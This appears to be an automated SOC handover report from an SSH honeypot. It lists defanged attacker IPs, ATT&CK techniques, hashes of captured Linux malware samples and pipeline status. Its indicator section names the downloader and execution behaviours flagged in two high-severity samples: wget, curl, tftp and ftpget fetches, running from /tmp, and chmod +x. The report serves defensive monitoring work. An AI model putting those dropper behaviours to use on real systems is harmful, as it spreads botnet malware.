| `34.76.149[.]154` | 1 | 2026-08-10 02:37 | 2026-08-10 02:37 | 6s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]147` | 1 | 2026-08-10 01:05 | 2026-08-10 01:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.198.224[.]26` | 1 | 2026-08-10 04:18 | 2026-08-10 04:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.14[.]5` | 1 | 2026-08-10 02:45 | 2026-08-10 02:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]252` | 1 | 2026-08-10 01:41 | 2026-08-10 01:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.29.30[.]13` | 1 | 2026-08-10 03:58 | 2026-08-10 03:58 | 13s | 0 | `T1592` | 🟢 LOW |
| `54.204.71[.]163` | 1 | 2026-08-10 01:21 | 2026-08-10 01:22 | 2s | 0 | `T1592` | 🟢 LOW |
| `60.211.233[.]218` | 1 | 2026-08-10 00:59 | 2026-08-10 01:00 | 19s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]207` | 1 | 2026-08-10 03:26 | 2026-08-10 03:26 | 4s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]92` | 1 | 2026-08-10 04:29 | 2026-08-10 04:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]86` | 1 | 2026-08-10 01:48 | 2026-08-10 01:49 | 15s | 0 | `T1592` | 🟢 LOW |
| `69.5.169[.]200` | 1 | 2026-08-10 02:57 | 2026-08-10 02:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.66.45[.]101` | 1 | 2026-08-10 01:10 | 2026-08-10 01:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]1` | 1 | 2026-08-10 01:14 | 2026-08-10 01:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `87.250.22[.]34` | 1 | 2026-08-10 01:21 | 2026-08-10 01:21 | 13s | 0 | `T1592` | 🟢 LOW |
| `91.245.100[.]66` | 1 | 2026-08-10 01:32 | 2026-08-10 01:32 | 11s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]100` | 1 | 2026-08-10 04:17 | 2026-08-10 04:18 | 77s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 84/100 | 🔴 HIGH | **36/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `91.245.100[.]66` | UA | Centr Servisnogo Oblslugovuvannya Ltd | **100** ⚠️ | 3 |
| `139.199.80[.]137` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 10 |
| `207.219.221[.]101` | CA | TELUS Communications Inc. | **100** ⚠️ | 50 |
| `190.226.61[.]45` | AR | PICCININ I | **100** ⚠️ | 4 |
| `75.80.65[.]214` | US | Charter Communications Inc | **100** ⚠️ | 50 |
| `164.92.115[.]22` | US | DigitalOcean, LLC | **100** ⚠️ | 7 |
| `111.42.175[.]101` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `113.158.205[.]225` | JP | DION (KDDI CORPORATION) | **100** ⚠️ | 50 |
| `94.154.43[.]100` | TR | Storm Industries LLC | **100** ⚠️ | 2 |
| `113.59.40[.]90` | CN | China Unicom Hainan province network | **100** ⚠️ | 1 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 111 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 94 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 22 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 21 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 19 |

---

## 🔕 False Positive Summary (102 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 6 |
| AbuseIPDB score 11 below threshold 25 | 4 |
| AbuseIPDB score 16 below threshold 25 | 7 |
| AbuseIPDB score 17 below threshold 25 | 3 |
| AbuseIPDB score 18 below threshold 25 | 1 |
| AbuseIPDB score 22 below threshold 25 | 4 |
| AbuseIPDB score 3 below threshold 25 | 4 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 72 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 354 cases |
| Tool 34  | Credential Extractor        | ✅ 384 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 19 fingerprints |
| Tool 36  | Command Clustering          | ✅ 8 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 146 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 102 filtered (28.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 100 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 22 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 94 priority case(s) shown individually · 53 recon entry/entries in table (19 group(s) consolidating 124 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-10T05:38:35Z_
